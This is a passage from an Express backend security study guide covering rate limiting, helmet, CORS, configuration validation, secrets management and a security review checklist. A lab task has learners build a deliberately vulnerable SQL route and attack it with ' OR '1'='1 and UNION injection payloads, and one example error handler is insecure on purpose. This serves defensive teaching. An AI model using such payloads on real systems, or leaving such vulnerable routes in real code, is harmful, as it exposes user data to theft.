5. *What is the `Vary: Origin` header for?* If you return different `Allow-Origin` values per request, caches must vary by `Origin`; the `cors` package sets it for you.

**Common mistakes**

- `origin: '*'` together with `credentials: true`.
- Reflecting `req.headers.origin` without checking an allow-list.
- Allow-listing by `endsWith('example.com')` (matches `evilexample.com`); compare exact origins or parse the hostname properly.
- Treating CORS as authentication.
- Forgetting to handle `OPTIONS` in custom setups, or placing `cors()` after a route that already responded.

**Revision notes**

- CORS = browser-enforced relaxation of same-origin policy; origin = scheme + host + port.
- Preflight for non-simple requests; credentials need an exact origin.
- Allow-list; never reflect; not a security control for your server.
- Not a CSRF defence.

### 5.5 Rate limiting `[ESSENTIAL]`

**Concept**

Rate limiting = ek client ko ek time window mein limited requests allow karna. Use cases: brute-force login protection, credential stuffing slow karna, API abuse/scraping, cost control, protecting the database from spikes, and fairness between tenants.

**Why it matters**

Without it, bcrypt-protected login can still be attacked at scale (and bcrypt itself becomes a CPU/thread-pool DoS target). Interviewers also ask you to *design* a rate limiter (Week 7 / Day 2 notes, `EX-RATE-01`).

**Internal working: algorithms**

| Algorithm | How it works | Pros | Cons |
|---|---|---|---|
| Fixed window | Counter per key per time window (for example 100 per minute), resets at window end | Simplest, cheap | Burst at window boundary (up to 2x limit) |
| Sliding window (log or counter) | Counts requests over the last N seconds | Smoother, accurate | More memory/CPU |
| Token bucket | Bucket refills at a steady rate; each request takes a token; bucket size allows bursts | Allows bursts, steady average | Slightly more state |
| Leaky bucket | Requests queue and drain at a constant rate | Smooth output | Delays/queue |

Key design choices:

- **Key**: IP address, user id, API key, or combination (for login: IP plus account identifier).
- **Storage**: in-process memory works for one instance only; with several instances (or after restarts) use a shared store such as Redis (Week 6 / Day 4, Week 7 / Day 2) so counts are global.
- **Response**: `429 Too Many Requests` with `Retry-After` and standard rate-limit headers.
- **Behind a proxy**: `req.ip` is the proxy's address unless you configure `app.set('trust proxy', N)` with the *exact* number of trusted hops. If you trust too much, attackers spoof `X-Forwarded-For` and bypass limits; if you trust too little, all users share one IP and get blocked together.

Learning-only fixed-window limiter (to understand internals; use a library in real code):

```js
// learning-only: in-memory fixed window
const hits = new Map(); // key -> { count, resetAt }

export function fixedWindowLimiter({ windowMs, limit }) {
  return (req, res, next) => {
    const now = Date.now();
    const key = req.ip;
    let entry = hits.get(key);
    if (!entry || entry.resetAt <= now) {
      entry = { count: 0, resetAt: now + windowMs };
      hits.set(key, entry);
    }
    entry.count += 1;
    if (entry.count > limit) {
      res.set('Retry-After', String(Math.ceil((entry.resetAt - now) / 1000)));
      return res.status(429).json({ error: { message: 'Too many requests' } });
    }
    next();
  };
}
// Problems to notice: the Map never shrinks (memory leak), counts are per process, and
// boundary bursts are possible. Those are exactly the issues libraries and Redis solve.
```

**Code example: express-rate-limit**

```js
// src/middleware/security.js (continued)
import rateLimit from 'express-rate-limit';

// Option name note: express-rate-limit v7+ uses `limit` (older tutorials show `max`, still accepted).
const tooMany = (req, res, next, options) =>
  next(new AppError(options.statusCode, 'Too many requests, please try again later', 'RATE_LIMITED'));

// General API limiter
export const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 300,
  standardHeaders: 'draft-7', // sends RateLimit headers; Retry-After is set when limited
  legacyHeaders: false,       // no X-RateLimit-* headers
  handler: tooMany,
});

// Strict limiter for credential endpoints; only failed attempts count
export const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 10,
  skipSuccessfulRequests: true,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  handler: tooMany,
});

// Signup limiter: slow down account-creation abuse
export const signupLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  limit: 20,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  handler: tooMany,
});
```

Mount them:

```js
app.use('/api', apiLimiter);
authRouter.post('/login', loginLimiter, loginHandler);
authRouter.post('/signup', signupLimiter, signupHandler);
```

Version-dependent notes (flagged): if you build a custom `keyGenerator` that uses `req.ip` in express-rate-limit v8, use its exported `ipKeyGenerator` helper so IPv6 clients are grouped by subnet and cannot rotate addresses to evade the limit. Check the docs of the major version you install. The default in-memory store is per process; for several instances use a Redis store (`rate-limit-redis`).

Per-account protection (in addition to per-IP): count failed logins per email (in Redis or a DB column), and after N failures add an increasing delay, require CAPTCHA/MFA, or temporarily lock the account. Be careful: pure hard lockout lets an attacker lock out real users deliberately (a denial of service), so prefer progressive delays and notify the owner [ADVANCED].

**Frontend connection**

Debounce/throttle search input on the frontend reduces requests but it is polite behavior, not protection; the server limit is the real control. On `429`, the frontend should read `Retry-After` and show a message instead of retrying instantly (exponential backoff, Week 6 / Day 3).

**Real-world scenario**

Payments API: each merchant API key gets 100 requests per second with burst capacity (token bucket) so a spike on sale day does not kill the database; the `/login` endpoint gets 5 failed attempts per 15 minutes per IP and per account. Webhooks from a trusted provider are exempted by IP allow-list.

**Interview answer:**

"Rate limiting restricts how many requests a client can make in a time window to stop brute force, abuse and overload. I would use a token bucket or sliding window keyed by IP, user or API key, return 429 with Retry-After, apply a much stricter limit to login and signup, and combine per-IP limits with per-account throttling. Memory-based counters only work for a single instance, so in a multi-instance deployment the counters live in Redis, and I make sure the trust-proxy setting is correct so the real client IP is used."

**Follow-up questions**

1. *Fixed window vs token bucket?* Fixed window is simple but allows a 2x burst at the boundary; token bucket allows controlled bursts with a steady average rate.
2. *How do you rate-limit across multiple servers?* Shared atomic counters in Redis (`INCR` + `EXPIRE`, or a Lua script for token bucket).
3. *What status code and headers?* 429, `Retry-After`, and standard `RateLimit` headers.
4. *Why is `trust proxy` important?* Without it you rate-limit the load balancer's IP; with it set too loosely clients can spoof `X-Forwarded-For`.
5. *Does rate limiting stop DDoS?* Not by itself. Volumetric DDoS is handled at the edge (CDN/WAF/cloud provider); app-level limits protect against application-layer abuse.

**Common mistakes**

- In-memory limiter behind several instances (each has its own counters).
- Limiting by IP only (shared office/NAT IPs get blocked; botnets rotate IPs).
- No stricter limit on login/signup/password-reset.
- Wrong `trust proxy` setting.
- Returning 200 with an error body instead of 429.

**Revision notes**

- Algorithms: fixed window, sliding window, token bucket, leaky bucket.
- 429 + `Retry-After`; stricter limits on auth endpoints.
- Distributed deployments need a shared store (Redis).
- Configure `trust proxy` correctly; per-account throttling complements per-IP.

### 5.6 helmet and basic hardening `[ESSENTIAL]`

**Concept**

`helmet` is Express middleware that sets a bundle of security-related HTTP response headers with sensible defaults.

| Header | Purpose |
|---|---|
| `Content-Security-Policy` | Restricts where scripts/styles/frames may load from (XSS mitigation) |
| `Strict-Transport-Security` (HSTS) | Tells browsers to use HTTPS only for this host for a period |
| `X-Content-Type-Options: nosniff` | Stops MIME sniffing (JSON/text executed as script/HTML) |
| `X-Frame-Options` / CSP `frame-ancestors` | Prevents clickjacking (embedding your page in a malicious iframe) |
| `Referrer-Policy` | Limits URL leakage in the Referer header |
| `Cross-Origin-Resource-Policy` / `Cross-Origin-Opener-Policy` | Isolates resources/windows from other origins |
| removes `X-Powered-By` | Avoids advertising "Express" to scanners |

**Code example**

```js
import express from 'express';
import helmet from 'helmet';

const app = express();
app.disable('x-powered-by');          // helmet also removes it; explicit is fine
app.use(helmet());                    // defaults are a good baseline
app.use(express.json({ limit: '10kb' })); // limit body size: blocks oversized-payload abuse
```

Other cheap hardening steps: limit JSON body size, limit upload size and type (Week 3 / Day 6), set timeouts on the HTTP server (`server.requestTimeout`, `headersTimeout`), validate all inputs, and never expose stack traces.

**Interview answer:**

"I add helmet as a baseline to set headers such as HSTS, nosniff, frame protections and a Content-Security-Policy, and I disable X-Powered-By. These headers are defence in depth: they do not fix vulnerable code, but they reduce the impact of XSS, clickjacking and downgrade attacks. I also cap request body size and set server timeouts."

**Follow-up questions**

1. *Does helmet make my app secure?* No. It is one layer; input validation, authorization and parameterized queries still matter.
2. *Why HSTS only on HTTPS?* Browsers ignore HSTS on plain HTTP; terminate TLS properly first, then enable it.
3. *Why limit the body size?* Prevents memory and CPU exhaustion from huge JSON payloads.

**Common mistakes**

- Disabling CSP completely when it blocks something instead of tuning it.
- Setting HSTS with a long `max-age` before HTTPS is fully working.
- Assuming helmet replaces input validation.

**Revision notes**

- `app.use(helmet())` baseline; remove `X-Powered-By`; cap body size; set server timeouts.

### 5.7 Attack and defence summary

| Attack | Root cause | Primary defence | Extra layers |
|---|---|---|---|
| SQL injection | Untrusted input concatenated into SQL | Parameterized queries, allow-lists for identifiers | Least-privilege DB user, no DB errors to clients |
| NoSQL injection | Untrusted objects/operators in queries | Type validation (zod), no `$where` | express-mongo-sanitize, least privilege |
| XSS | Untrusted data rendered as HTML/script | Context-aware output encoding | CSP, nosniff, httpOnly cookies, allow-list sanitizer |
| CSRF | Browser auto-sends cookies cross-site | SameSite cookies, CSRF token/Origin check | No state change on GET, custom headers |
| CORS misconfig | Reflecting origins / wildcard with credentials | Exact origin allow-list | Do not treat as auth |
| Brute force / stuffing | Unlimited login attempts | Rate limiting + per-account throttling | MFA, breached-password checks |
| IDOR/BOLA | No object-level authorization | Ownership checks in queries/services | Tests for cross-user access |
| Mass assignment | Copying request body into models | Whitelist/strict schemas | Separate admin endpoints for privileged fields |

### Day 5 wrap-up

**Key concepts to remember**

- Parameterize values; allow-list identifiers; least privilege; hide DB errors.
- XSS fix = output encoding; CSP/nosniff/httpOnly are extra layers; no regex sanitizers.
- CSRF applies to cookie-auth; SameSite, Origin checks, CSRF tokens; CORS is not a CSRF defence.
- CORS is browser-enforced; exact allow-lists; never reflect origins with credentials.
- Rate limiting: 429 + Retry-After; shared store for multi-instance; stricter on auth; `trust proxy`.
- helmet is a baseline, not a fix.

**Five revision questions**

1. Show a SQL injection payload against `WHERE email = '${email}'` and explain the fix.
2. What is the difference between stored and reflected XSS, and which layers reduce the damage?
3. Explain a CSRF attack step by step and why a Bearer-token API is not vulnerable.
4. Why is `Access-Control-Allow-Origin` reflection with credentials dangerous?
5. Compare fixed window and token bucket rate limiting, and say what breaks with in-memory counters on three instances.

**One practical coding task**

In the lab, create a deliberately vulnerable route (`/unsafe/users`) and a fixed route (`/users`). Write a script that attacks both with `' OR '1'='1` and a UNION payload and prints the row counts. Then add `loginLimiter` and `requireTrustedOrigin` and write a script that proves the 11th failed login in 15 minutes returns 429 and that a POST with `Origin: https://evil.example` to `/auth/refresh` returns 403. Delete the unsafe route at the end. Maps to `EX-MW-01` and `EX-RATE-01`.

**Self-assessment checklist**

- [ ] I can demonstrate and fix SQL injection, including ORDER BY.
- [ ] I can explain reflected, stored and DOM XSS and list four defences.
- [ ] I can explain CSRF and when it does not apply.
- [ ] I can explain preflight and why CORS is not server-side security.
- [ ] I can configure rate limits and explain the multi-instance problem.
- [ ] I can name five helmet headers and what they do.

---

## Day 6 - Secure configuration, secrets management, common production security mistakes

**Time plan (about 2 hours):** 25 min env vars + validated config, 25 min secrets management + rotation, 30 min production mistakes list, 25 min assemble the hardened app, 15 min revision and coding.

**Learning objectives**

- Load configuration from environment variables with fail-fast validation, and explain `.env` files vs real secret managers.
- Explain what counts as a secret, how secrets leak, and what to do when one leaks (rotate first).
- Describe JWT signing-key rotation with `kid` and why it matters.
- List and fix the most common production security mistakes (the interviewers' favourite "what would you check in a code review?" list).
- Assemble all of this week's pieces into one hardened Express 5 application and a server with graceful shutdown.

### 6.1 Environment-based configuration `[ESSENTIAL]`

**Concept**

Config (DB host, ports, JWT secret, CORS origins) code mein hard-code nahi karte. Ye environment variables se aate hain (twelve-factor app principle: config in the environment). Same code, alag environment (dev, staging, prod) -- sirf config badalta hai.

**Why it matters**

- Hard-coded secrets in source control are among the most common real breaches.
- Missing or invalid config should crash the app at startup (fail fast), not at 2 AM when the first request needs the value.
- Interviewers ask: "How do you manage secrets and config across environments?"

**Internal working**

- `process.env` is a plain object of strings (`process.env.PORT` is `'3000'`, not `3000`). Everything needs parsing and validation.
- Node 20.6+ can load a `.env` file natively: `node --env-file=.env src/server.js`. No `dotenv` dependency is needed. Variables that already exist in the real environment take precedence over values in the file. `--env-file-if-exists` (Node 22.9+/20.x later minor) ignores a missing file, useful in production where no file exists. `process.loadEnvFile('.env')` (Node 21.7+/20.12+) loads from code. Flagged because exact minor versions vary; check `node --version` and the Node docs for your build.
- A `.env` file is a *local development convenience*. In production, the platform injects real environment variables (Docker/Kubernetes secrets, systemd, PM2 ecosystem file, cloud console) or the app fetches secrets from a secret manager.

**Code example: validated, frozen config (replaces the Day 1 stub)**

```js
// src/config.js
import { z } from 'zod';

const schema = z.object({
  NODE_ENV: z.enum(['development', 'test', 'production']).default('development'),
  PORT: z.coerce.number().int().min(1).max(65535).default(3000),

  DB_HOST: z.string().min(1),
  DB_PORT: z.coerce.number().int().default(3306),
  DB_USER: z.string().min(1),
  DB_PASSWORD: z.string().min(1),
  DB_NAME: z.string().min(1),

  MONGODB_URI: z.string().startsWith('mongodb').optional(),

  JWT_ACCESS_SECRET: z.string().min(32, 'JWT_ACCESS_SECRET must be at least 32 characters'),
  JWT_ISSUER: z.string().min(1).default('week5-lab'),
  JWT_AUDIENCE: z.string().min(1).default('week5-lab-clients'),

  // comma-separated list of exact origins
  CORS_ORIGINS: z
    .string()
    .default('')
    .transform((s) => s.split(',').map((x) => x.trim()).filter(Boolean)),

  BCRYPT_COST: z.coerce.number().int().min(10).max(15).default(12),
});

const parsed = schema.safeParse(process.env);

if (!parsed.success) {
  // Print WHICH variables are wrong, never their values (values may be secrets)
  console.error('Invalid environment configuration:');
  for (const issue of parsed.error.issues) {
    console.error(` - ${issue.path.join('.')}: ${issue.message}`);
  }
  process.exit(1);
}

const env = parsed.data;

// Production-only guard rails
if (env.NODE_ENV === 'production') {
  if (/change|secret|password|example/i.test(env.JWT_ACCESS_SECRET)) {
    console.error('Refusing to start: JWT_ACCESS_SECRET looks like a placeholder.');
    process.exit(1);
  }
  if (env.CORS_ORIGINS.length === 0) {
    console.error('Refusing to start: CORS_ORIGINS must list the real frontend origin(s).');
    process.exit(1);
  }
}

export const config = Object.freeze({
  env: env.NODE_ENV,
  port: env.PORT,
  db: Object.freeze({
    host: env.DB_HOST,
    port: env.DB_PORT,
    user: env.DB_USER,
    password: env.DB_PASSWORD,
    database: env.DB_NAME,
  }),
  mongoUri: env.MONGODB_URI,
  jwt: Object.freeze({
    accessSecret: env.JWT_ACCESS_SECRET,
    issuer: env.JWT_ISSUER,
    audience: env.JWT_AUDIENCE,
  }),
  corsOrigins: Object.freeze(env.CORS_ORIGINS),
  bcryptCost: env.BCRYPT_COST,
});
```

Because other modules do `import { config } from './config.js'`, this runs once at startup and the whole app shares a validated, immutable object. Code elsewhere never touches `process.env` directly.

**Frontend connection**

Vite/CRA mein `.env` files aur `VITE_*` variables tumne use kiye honge. Ek bahut important farak: frontend env variables browser bundle mein *embed* ho jaate hain, toh unmein koi secret nahi hona chahiye (sab public hai). Backend env variables server par rehte hain, isliye secrets yahin rakhe jaate hain. "Never put a secret in a `VITE_` variable" is the frontend-side version of this lesson.

**Real-world scenario**

Deployment goes out with `JWT_ACCESS_SECRET` missing. With a naive `jwt.sign(payload, process.env.JWT_ACCESS_SECRET)` the library throws on the first login, which may be hours after the deploy (users who are already logged in keep working until then, so nobody notices at first). A startup validation catches it in seconds during the rollout and the previous version keeps serving.

**Interview answer:**

"I keep configuration in environment variables, parse and validate them once at startup with a schema, and fail fast with a clear error that names the bad variable but never prints its value. The config is frozen and imported everywhere, so no module reads process.env ad hoc. For local development I use an uncommitted .env file loaded with Node's --env-file flag, with a committed .env.example for documentation. In production the platform injects variables or the app reads from a secret manager."

**Follow-up questions**

1. *Why not commit `.env`?* It contains real secrets; once in git history it is effectively public to everyone with repo access, forks and CI logs.
2. *Does `--env-file` override existing environment variables?* No, variables already set in the environment win over the file's values.
3. *Why parse numbers explicitly?* `process.env` values are always strings; `'0'` and `'false'` are truthy strings.
4. *How do you handle different environments?* Separate values per environment, injected by the deployment system; `NODE_ENV` switches behaviors such as secure cookies and verbose errors. Be careful: `NODE_ENV=production` also changes library behavior (Express caches views, less verbose errors).

**Common mistakes**

- `process.env.X` scattered everywhere, unvalidated.
- `if (process.env.DEBUG)` where `DEBUG='false'` is truthy.
- Default values for secrets (`|| 'secret'`) that silently reach production.
- Printing the whole `process.env` or config at startup/in an error report.
- Committing `.env`, or putting secrets in `VITE_*` frontend variables.

**Revision notes**

- Config from env; validate once; fail fast; freeze; never default a secret.
- `.env` = local dev only, gitignored, with `.env.example` committed.
- `node --env-file` (20.6+), real env vars take precedence.

### 6.2 Secrets management `[ESSENTIAL]`

**Concept**

Secret = anything whose exposure lets someone act as you or access your data: DB passwords, JWT signing keys, API keys (payment gateway, SMS, email), OAuth client secrets, private keys, webhook signing secrets, encryption keys.

**Why it matters**

Leaked secrets are an attacker's easiest route: no hacking needed, just log in. Bots scan public GitHub continuously for AWS keys and tokens, and abuse them within minutes.

**Internal working: levels of maturity**

| Level | Approach | Notes |
|---|---|---|
| 0 | Hard-coded in source | Never. Everyone with the repo has it forever |
| 1 | `.env` in the server, not in git | Acceptable for tiny projects; file permissions matter |
| 2 | Platform-injected env vars / CI secrets / Docker or Kubernetes secrets | Common baseline; secrets are encrypted at rest by the platform |
| 3 | Secret manager (AWS Secrets Manager or SSM Parameter Store, GCP Secret Manager, HashiCorp Vault, Doppler) | Central access control, audit logs, versioning, rotation, short-lived credentials |

Principles:

1. **Never in git.** Add `.env` to `.gitignore` before the first commit. Use secret scanning (gitleaks, GitHub push protection) in CI and as a pre-commit hook.
2. **Least privilege.** Each service gets only the secrets it needs; the DB user for the app is not the DB admin.
3. **Rotate.** Secrets expire or are rotated on a schedule and *immediately* on suspected exposure (an employee leaves, a laptop is lost, a log leaked).
4. **Different secrets per environment.** The staging database password and the production one must differ; a leaked staging secret must not open production.
5. **Never log secrets.** Redact `authorization`, `cookie`, `password`, `token` fields in logs (Week 6 / Day 2 covers structured logging with redaction).
6. **Keep secrets out of URLs, error messages, client bundles, Docker image layers and CI output.**

**If a secret is committed to git:** deleting the file in a new commit does *not* help; it stays in history, forks, caches and clones. Steps: (1) **rotate the secret immediately** (it must be treated as compromised), (2) check logs/audit trails for misuse, (3) optionally rewrite history with `git filter-repo` and force-push, (4) add scanning to prevent a repeat. Rotation is the part that actually fixes the problem.

**Code example: reading from AWS Secrets Manager at startup** `[ADVANCED]`

```js
// src/secrets.js (requires: npm install @aws-sdk/client-secrets-manager)
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

const client = new SecretsManagerClient({ region: process.env.AWS_REGION });

export async function loadJsonSecret(secretId) {
  const out = await client.send(new GetSecretValueCommand({ SecretId: secretId }));
  if (!out.SecretString) throw new Error(`Secret ${secretId} has no string value`);
  return JSON.parse(out.SecretString); // for example { "DB_PASSWORD": "...", "JWT_ACCESS_SECRET": "..." }
}

// at startup, before building config:
// const secrets = await loadJsonSecret(process.env.APP_SECRET_ID);
// Object.assign(process.env, secrets);   // then run the same validated config schema
```

The application authenticates to AWS with an IAM role attached to the server/container (no long-lived AWS keys in env vars). That is the same principle again: avoid storing the "key to the keys".

**Code example: JWT signing-key rotation with `kid`** `[ADVANCED]`

Problem: if you change `JWT_ACCESS_SECRET`, every existing access token becomes invalid immediately. Solution: keep several keys, tag each token with the key id in the header, sign with the newest, and verify with whichever key matches.

```js
// src/services/tokens.js (rotation-aware version)
import jwt from 'jsonwebtoken';
import { config } from '../config.js';

// JWT_KEYS='{"k2":"<newer-secret>","k1":"<older-secret>"}'  JWT_ACTIVE_KID='k2'
const keyring = new Map(Object.entries(JSON.parse(process.env.JWT_KEYS ?? '{}')));
const activeKid = process.env.JWT_ACTIVE_KID;

export function signAccessToken(user) {
  return jwt.sign({ role: user.role }, keyring.get(activeKid), {
    algorithm: 'HS256',
    keyid: activeKid,                  // goes into the JWT header as "kid"
    subject: String(user.id),
    issuer: config.jwt.issuer,
    audience: config.jwt.audience,
    expiresIn: '15m',
  });
}

export function verifyAccessToken(token) {
  return new Promise((resolve, reject) => {
    jwt.verify(
      token,
      (header, callback) => {
        const key = keyring.get(header.kid);
        return key ? callback(null, key) : callback(new Error('Unknown key id'));
      },
      { algorithms: ['HS256'], issuer: config.jwt.issuer, audience: config.jwt.audience },
      (err, payload) => (err ? reject(err) : resolve(payload)),
    );
  });
}
```

Rotation procedure: add `k2` to the keyring and make it active -> wait longer than the access-token TTL (15 minutes) -> remove `k1`. Note that `verifyAccessToken` is now async, so `authenticate` must `await` it (Express 5 handles the rejected promise if you write the middleware as `async`).

**Code example: comparing secrets safely (API keys, webhook tokens)**

```js
import { createHash, timingSafeEqual } from 'node:crypto';

// `===` can leak how many leading characters matched through timing. Compare digests instead.
export function safeEqual(a, b) {
  const ha = createHash('sha256').update(String(a)).digest();
  const hb = createHash('sha256').update(String(b)).digest();
  return timingSafeEqual(ha, hb); // equal-length buffers required; hashing guarantees it
}
```

Also use `crypto.randomBytes` or `crypto.randomUUID` for tokens and reset codes, never `Math.random()` (predictable).

**Frontend connection**

Same split you know: public config (API base URL) can live in the bundle; anything secret (Stripe *secret* key, DB password) must stay on the server. Stripe's publishable key goes to the frontend, secret key only on the backend. Calling third-party APIs that need a secret key directly from React is a classic beginner leak; route those calls through your backend.

**Real-world scenario**

A developer pushes a `.env` with the payment-gateway secret to a public repo. A bot finds it within minutes and creates fraudulent refunds. Incident response: rotate the gateway key (dashboard), review refund logs, enable secret scanning, move secrets to the cloud secret manager, give the app an IAM role instead of static credentials. The post-mortem notes that deleting the commit was not the fix: rotation was.

**Interview answer:**

"I never commit secrets; configuration comes from environment variables or a secret manager, validated at startup. Local development uses an ignored .env file; production uses platform-injected secrets or AWS Secrets Manager with an IAM role, so there are no long-lived keys on disk. Each environment has distinct secrets, access is least-privilege, and secrets are rotated regularly and immediately after any suspected exposure. I scan commits for secrets in CI, redact them from logs, and for JWT keys I support rotation using a key id so old tokens remain valid until they expire. If a secret ever lands in git, I rotate it first and clean the history second."

**Follow-up questions**

1. *Environment variables vs secret manager?* Env vars are simple and fine for many apps but are visible to anything that can read the process environment (child processes, crash dumps, some admin UIs). A secret manager adds central access control, audit logs, versioning and automated rotation.
2. *How would you rotate the database password with no downtime?* Create a second DB user/credential, deploy the new secret, wait until all instances use it, then drop the old credential. Secret managers can automate this.
3. *Why are JWT secrets special?* Whoever holds the signing key can mint a valid token for any user (admin included). It must be long and random (at least 256 bits), stored securely, and rotated with a key id.
4. *Is base64 encoding a secret hiding it?* No, it is encoding, not encryption. Kubernetes Secrets are base64 by default and need encryption at rest and RBAC to be meaningful.
5. *What should the `.env.example` contain?* Variable names with harmless placeholder values and comments.

**Common mistakes**

- Committing `.env` or config files with real credentials.
- Same secrets for dev, staging and prod.
- Secrets baked into Docker images (`ENV` or `COPY .env`) which remain in image layers.
- Logging request headers and bodies unredacted.
- Weak JWT secrets (`secret`, `jwtsecret`) or secrets shared between unrelated services.
- Giving the application the database root account.
- No rotation plan, so nobody knows how to rotate during an incident.

**Revision notes**

- Never in git; scan for secrets; least privilege; per-environment secrets.
- Rotate on a schedule and on exposure; rotation, not history cleanup, fixes a leak.
- JWT keys: long random, `kid` rotation.
- `crypto.randomBytes` for tokens; `timingSafeEqual` for comparisons.

### 6.3 Common production security mistakes (review checklist) `[ESSENTIAL]`

Use this as a code-review checklist and as raw material for "what would you check in a backend security review?" answers.

| # | Mistake | Why it hurts | Fix |
|---|---|---|---|
| 1 | String-built SQL / Mongo filters from raw input | Injection, data breach | Parameterized queries, schema validation |
| 2 | Missing ownership checks (IDOR/BOLA) | Users read/modify each other's data | Check ownership in query/service; tests for cross-user access |
| 3 | Authentication only, no authorization | Any logged-in user hits admin endpoints | `requireRole`/permissions on every route |
| 4 | Plain-text or fast-hash passwords | Mass account takeover after a leak | bcrypt/Argon2id with proper cost |
| 5 | Different error messages for unknown email vs wrong password | User enumeration | Generic message + equalized timing |
| 6 | No rate limiting on login, signup, password reset, OTP | Brute force, credential stuffing, SMS/email cost abuse | Per-IP and per-account limits |
| 7 | Long-lived JWT access tokens, no revocation | Stolen token usable for weeks | 15-minute access + rotating refresh tokens |
| 8 | JWT verified with `decode`, or no `algorithms` pin | Forged tokens | `verify` with explicit algorithms, iss, aud |
| 9 | Tokens in `localStorage` + any XSS | Token theft | Access token in memory, refresh in httpOnly cookie, CSP |
| 10 | Cookies without `HttpOnly`, `Secure`, `SameSite` | XSS theft, sniffing, CSRF | Set all three explicitly |
| 11 | `cors({ origin: true, credentials: true })` or wildcard | Cross-site data theft | Exact allow-list |
| 12 | Stack traces and SQL errors returned to clients | Information disclosure | Central error handler with generic 500 body |
| 13 | Secrets in git, images, logs or frontend bundles | Full compromise | Secret manager, scanning, redaction |
| 14 | Logging passwords, tokens, card numbers, full request bodies | Secrets leak via logs and log vendors | Redaction, log only what you need |
| 15 | Mass assignment (`Model.create(req.body)`) | Privilege escalation (`role: 'admin'`) | Whitelist fields, strict schemas |
| 16 | No request body size limit / no timeouts | Memory exhaustion, slowloris-type attacks | `express.json({ limit })`, server timeouts |
| 17 | File uploads trusted by extension/name | Malware, path traversal, stored XSS | Validate type and size, random filenames, store outside web root or in object storage |
| 18 | Password reset tokens that are guessable, reusable or never expire | Account takeover | 32 random bytes, hashed in DB, 15-30 minute expiry, single use, uniform response |
| 19 | `Math.random()` for tokens or OTPs | Predictable values | `crypto.randomBytes` / `crypto.randomInt` |
| 20 | Running with DB root user and open DB port to the internet | One bug becomes total compromise | Least-privilege DB user, private network/security groups |
| 21 | No HTTPS / no HSTS / `Secure` cookie missing | Credentials sniffed | TLS everywhere, HSTS |
| 22 | Outdated or vulnerable dependencies | Known exploits (supply chain too) | `npm audit`, lockfile, Dependabot/Renovate, minimal dependencies |
| 23 | `trust proxy` wrong | Spoofed IPs defeat rate limits and logs | Set exact hop count |
| 24 | SSRF: server fetches user-supplied URLs (webhooks, image fetch) | Access to internal network or cloud metadata | Allow-list hosts/schemes, block private IP ranges, timeouts [ADVANCED] |
| 25 | Regex with catastrophic backtracking on user input (ReDoS) | CPU pinned, event loop blocked | Simple regexes, input length limits, validated libraries [ADVANCED] |
| 26 | Prototype pollution through unsafe deep merge of user JSON | Logic bypass, privilege flags set | Avoid deep-merging untrusted input, validate schemas, `Object.create(null)` maps [ADVANCED] |
| 27 | Business-logic gaps: replayable payment requests, negative amounts, race conditions | Money loss | Idempotency keys, DB constraints, transactions (Week 6 / Day 3) |
| 28 | Sensitive data over-exposure in API responses | Data leaks to clients | Select explicit columns, response DTOs |

**NEVER DO: leaking internals in error responses**

```js
// NEVER DO -- returns stack traces and SQL details to any caller
app.use((err, req, res, next) => {
  res.status(500).json({ message: err.message, stack: err.stack, sql: err.sql });
});
```

**Fixed: central error handler that maps known errors and hides the rest**

```js
// src/errors.js (final version; replaces errorHandler from the lab setup)
import { ZodError } from 'zod';

export function errorHandler(err, req, res, next) {
  if (res.headersSent) return next(err);

  // Validation errors: safe to describe, they only mention the client's own input shape
  if (err instanceof ZodError) {
    return res.status(400).json({
      error: {
        code: 'VALIDATION_ERROR',
        message: 'Invalid request',
        details: err.issues.map((i) => ({ path: i.path.join('.'), message: i.message })),
      },
    });
  }

  // Malformed JSON and oversized bodies raised by express.json()
  if (err.type === 'entity.parse.failed') {
    return res.status(400).json({ error: { code: 'BAD_JSON', message: 'Malformed JSON body' } });
  }
  if (err.type === 'entity.too.large') {
    return res.status(413).json({ error: { code: 'PAYLOAD_TOO_LARGE', message: 'Request body too large' } });
  }

  const status = err instanceof AppError ? err.status : 500;
  if (status >= 500) console.error(err); // real apps: structured logger with redaction (Week 6)

  res.status(status).json({
    error: {
      code: err.code ?? (status >= 500 ? 'INTERNAL_ERROR' : 'REQUEST_ERROR'),
      message: status >= 500 ? 'Internal Server Error' : err.message,
    },
  });
}
```

(Keep the `AppError` class and `notFound` from the lab setup in the same file. The unknown-error branch intentionally never forwards `err.status` from third-party errors blindly.)

**Frontend connection**

A frontend dev reviewing a PR looks for `dangerouslySetInnerHTML` and exposed API keys. A backend security review is the same habit applied to the server: grep for string-built SQL, `req.body` passed straight into models, missing auth middleware, `cors({ origin: '*' })`, `console.log(req.headers)`.

**Real-world scenario**

Pre-launch review of a payments API. Findings: (1) `GET /invoices/:id` lacks ownership check, (2) JWT access tokens live 30 days, (3) CORS reflects any origin, (4) the 500 handler returns stack traces, (5) `.env.production` committed. Each item above is on the checklist; the team fixes (1)-(4) in a day and rotates all secrets for (5). Interviewers like candidates who can produce such a list unprompted.

**Interview answer:**

"In a security review I look at several layers. Input handling: parameterized queries, schema validation, no mass assignment. Authentication: bcrypt or Argon2id, short-lived JWTs with an explicit algorithm, rotating hashed refresh tokens in httpOnly cookies, rate limiting on login. Authorization: role checks on routes and ownership checks on every object, with tests for cross-user access. Transport and browser: HTTPS, HSTS, helmet, a strict CORS allow-list, CSRF protection for cookie flows. Operations: secrets outside the repo and rotated, errors that do not leak internals, logs that redact sensitive fields, dependency audits, least-privilege database accounts, and body size limits and timeouts."

**Follow-up questions**

1. *Which of these is the most common in real incidents?* Broken access control (missing ownership checks) and leaked or weak secrets.
2. *How do you test for IDOR?* Create two users, have user A create a resource, then call it with user B's token; expect 404/403. Automate it in integration tests.
3. *What is SSRF?* The server is tricked into making requests to internal addresses (for example cloud metadata endpoints) via a user-supplied URL. Defend with allow-lists and network egress controls.
4. *How do you keep dependencies safe?* Lockfile, `npm audit` in CI, automated update PRs, review new packages, and avoid unnecessary dependencies.
5. *How would you handle a security incident?* Contain (revoke/rotate), assess scope via logs, fix root cause, notify as required, and write a blameless post-mortem.

**Common mistakes**

- Treating security as a final "hardening" step instead of a design constraint.
- Fixing the single reported endpoint without searching for the same pattern elsewhere.
- Disabling a control (CSP, CORS, rate limit) "temporarily" and forgetting it.
- Not writing negative tests.

**Revision notes**

